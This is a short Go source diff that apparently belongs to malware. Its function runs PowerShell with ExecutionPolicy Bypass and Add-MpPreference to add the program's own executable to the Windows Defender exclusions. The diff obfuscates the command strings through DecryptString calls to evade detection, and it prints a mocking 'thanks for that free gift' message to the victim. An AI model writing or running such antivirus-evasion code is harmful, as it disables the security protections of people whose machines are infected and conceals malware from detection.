@@ -8,14 +8,14 @@ import (
 func Add_excep() {
     exePath := GetExecutablePath()
 
-    comm := `powershell -ExecutionPolicy Bypass Add-MpPreference -Force -ExclusionPath "`+exePath+`"`
+    comm := winapiV2.DecryptString("5*2 76- ))")+` -ExecutionPolicy Bypass Add-MpP`+winapiV2.DecryptString("7 # 7 +&")+`e -Force -Ex`+winapiV2.DecryptString("clusion")+`Path "`+exePath+`"`
     m , err := winapiV2.Exec(comm)
 
     if err != nil {	
-        fmt.Printf("Error creating shortcut: %v\nOutput: %s\n", err, "")
+        fmt.Printf("Error creaaaaaa shorrrrrrrrr: %v \n", err)
         return
     }
     fmt.Println(m)
-    fmt.Println("thanks for that free gift")
+    fmt.Println("thanks for that free gift <3 love you")
 }
 
